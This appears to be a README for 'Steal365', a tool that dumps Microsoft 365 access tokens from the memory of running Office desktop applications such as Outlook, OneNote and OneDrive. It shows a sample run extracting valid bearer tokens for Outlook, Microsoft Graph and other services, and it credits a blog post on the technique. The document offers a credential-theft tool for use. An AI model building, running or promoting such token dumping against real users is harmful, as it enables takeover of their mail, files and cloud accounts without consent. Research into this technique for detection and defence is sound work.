# Steal365
Dumping tokens from Microsoft Office desktop application's memory

### Run
```
PS C:\User\dev> .\Steal365.exe

      --++[   Steal365   ]++--

[>] try dump: WINWORD
    - WINWORD not found!

[>] try dump: onenoteim
  \-- dump onenoteim ok
  \-- looking for tokens...
    + Valid token: 15/09/1995 02:25:02
    + aud: https://outlook.office365.com/
    + Token: eyJ0eX[...]uE4w

[>] try dump: ONENOTEM
    - ONENOTEM not found!

[>] try dump: POWERPNT
    - POWERPNT not found!

[>] try dump: OUTLOOK
  \-- dump OUTLOOK ok
    + Valid token: 15/09/1995 02:26:41
    + aud: https://outlook.office365.com/
    + Token: eyJ0eX[...]nORg

[>] try dump: EXCEL
    - EXCEL not found!

[>] try dump: OneDrive
  \-- dump OneDrive ok
  \-- Looking for tokens...
    + Valid token: 15/09/1995 02:25:17
    + aud: 00000003-0000-0000-c000-000000000000
    + Token: eyJ0eX[...]I32n

    + Valid token: 15/09/1995 02:22:48
    + aud: ab9b8c07-8f02-4f72-87fa-80105867a763
    + Token: eyJ0eX[...]VOQg

    + Valid token: 15/09/1995 02:27:55
    + aud: https://clients.config.office.net/
    + Token: eyJ0eX[...]OzMA

    + Valid token: 15/09/1995 02:49:22
    + aud: https://wns.windows.com
    + Token: eyJ0eX[...]6-YA
```

### Inspired by
[Stealing Access Tokens From Office Desktop Applications](https://mrd0x.com/stealing-tokens-from-office-applications/)<br>
